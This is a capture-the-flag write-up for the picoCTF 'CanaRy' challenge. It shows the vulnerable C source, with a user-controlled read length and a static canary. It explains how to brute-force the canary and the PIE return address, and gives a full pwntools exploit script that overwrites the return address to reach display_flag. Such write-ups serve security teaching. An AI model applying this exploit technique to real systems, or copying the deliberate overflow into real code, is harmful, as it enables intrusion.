[Back](PicoFrontPage.md)

# CanaRy
---

### Tools
* GEF-GDB
* Pwntools - Python3
* Text editor

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  //FILE *f = fopen("/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt","r")
  //
  //;
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```

Important points:
* Stack canaries are used to alert when the stack has been altered.
	* A certain location on the stack will be compared with a certain value to check for buffer overflows.
	* Brute-forcing canaries is actually feasible for 32-bit systems

### Analysis

As you can see, the program asks for user input twice, one to store as string size for the next input, and the second is for just input.
For the first bit of input we are able to set a size for count which will define how much text we can feed it the next input. 

We can also see that the canary is actually read off a file in the `read_canary()` function.

As mentioned earlier - since this is 32-bit we can actually brute-force it. Just create a function that iterates through all characters while adjusting the size.

The distance to `$eip` can be found through earlier tricks - `cyclic`, using a disassembler, etc. Just make sure you set the size before if you're dynamically analyzing.
Note, the canary in the file doesn't change - once you cleared the brute-forcing and run into an error after, you can just create a script that skips the actual brute-forcing and instead go straight to overriding the `$eip`.

Through `checksec` we can see that PIE has been enabled. This means it won't be as easy to get to the location of the `display_flag()` function. However this can be brute-forced as well. Just run it through with the address `0x7ed` until a hint of pico is found in the return string and you should have it. 

```c
from pwn import *

# variables

canary = ''

# variables
buf_canary = 32 # buffer to canary
canary_eip = 16 # canary to eip
#canary_eip = 54 # canary to eip
#display_flag = 0x5655636d # address of display_flag
display_flag = 0x7ed

s = ssh(host='2019shell1.picoctf.com',user='Username',password='Password')

# looping through all possible bytes for the 4 bytes (32-bit) in canary
for i in range(4):
	for j in range(256):
		# set up connection and cd into correct directory
		p = s.process('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln', cwd='/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe')

		#p.recv()
		#p.sendline(b'1234')

		# set up payload
		payload = 'A'*buf_canary
		payload += canary
		payload += chr(j)

		# respond to initial message
		p.recvuntil(b'Please enter the length of the entry:\n> ')
		p.sendline(str(32+i+1))

		# send payload with canary
		p.recvuntil(b'Input> ')
		p.sendline(payload)
		recvmsg = p.recvall()

		if b'Stack Smashing Detected' not in recvmsg:
			canary += chr(j)
			print("\nCanary Character", i + 1, "=", chr(j), "\n")
			break
    #else:
	#print("error")
	#exit()

print("Brute forcing canary successful.\nCanary value is:", canary, "\n")

flag = ""

# brute forcing display_flag() address
while "pico" not in flag:
	p = s.process('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln', cwd='/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe')
	
	# real payload
	payload = b'A'*buf_canary
	payload += bytes(canary, 'utf-8')
	payload += b'A'*canary_eip
	payload += p32(display_flag)

	# skip through lines
	p.recvuntil(b'Please enter the length of the entry:\n> ')
	p.sendline(b'54')

	p.recvuntil(b'Input> ')
	p.sendline(payload)
	response = p.recvall()
	flag = str(response)
	p.close()

print(flag)

# do this
p.interactive()
``` 
